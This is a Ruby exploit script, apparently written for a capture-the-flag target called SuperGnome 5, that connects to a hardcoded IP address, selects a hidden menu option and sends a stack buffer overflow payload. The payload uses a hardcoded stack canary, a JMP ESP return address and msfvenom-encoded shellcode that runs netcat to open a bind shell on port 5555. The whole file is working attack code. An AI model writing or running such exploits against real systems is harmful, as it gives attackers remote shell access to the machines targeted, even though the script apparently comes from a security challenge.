#! /usr/bin/env ruby
#
# Exploit for the SuperGnome 5 TCP Server
#
# Daemonises netcat and creates bind shell on PORT 5555
#
require 'socket'

# Create the TCP Socket
HOST = '54.233.105.81'
PORT = 4242

puts "[+] Creating socket..."

s = TCPSocket.new(HOST, PORT)

# Create the fuzzing payload
canary = "\xe4\xff\xff\xe4" # Hardcoded canary value
eip = "\x6b\x93\x04\x08"    # JMP ESP instruction
ebp = "\x6b\x93\x04\x08"    # Any valid address (or ret breaks)

# First stage shellcode -> NOP sled + jump to our second stage
shellcode1 = "\x90" * 8
shellcode1 += "\xff\xe1"
shellcode1 += "\x90" * (85 - shellcode1.size) # Ensure 85 byte payload

# Second stage shellcode
# msfvenom -p linux/x86/exec -e x86/shikata_ga_nai -f ruby -b "\x00" CMD="nc -nlp 5555 -e /bin/sh &" AppendExit=true
# 95 bytes 
shellcode2  = 
  "\xdd\xc7\xba\x32\x42\x57\x0f\xd9\x74\x24\xf4\x5f\x33\xc9" +
  "\xb1\x12\x31\x57\x17\x03\x57\x17\x83\xf5\x46\xb5\xfa\x93" +
  "\x4d\x61\x9c\x31\x34\xf9\xb3\xd6\x31\x1e\xa3\x37\x31\x89" +
  "\x34\x2f\x9a\x2b\x5c\xc1\x6d\x48\xcc\xf5\x74\x8f\xf1\x05" +
  "\xe7\xec\xd1\x28\x99\x9e\x61\x12\x50\x6a\xb7\x67\xba\xb9" +
  "\xd2\xa7\x95\xa3\x75\xc9\xc6\x50\xee\x35\x3f\x97\xb9\x66" +
  "\xb6\x76\x88\x08\xf9\xa3\x79\x09\xa2\x9e\xfe"

shellcode2 += "\x90" * 8 # Ensure 103 bytes size

# Build final payload from components
payload = shellcode2 + canary + ebp + eip + shellcode1

# Choose hidden X option from the menu
while line = s.gets
  if line == "3 - Check logged in users\n"
    puts "[+] Selecting hidden option..."
    s.write("X\n")
    break
  end
end

# Wait for the Hidden Message
while line = s.gets
  if line == "This function is protected!\n"
    puts "[+] Sending payload..."
    s.write(payload)
    
    begin
      puts s.gets
    rescue Errno::ECONNRESET
      puts "[+] Crash!!"
    end

    break
  end
end

s.close
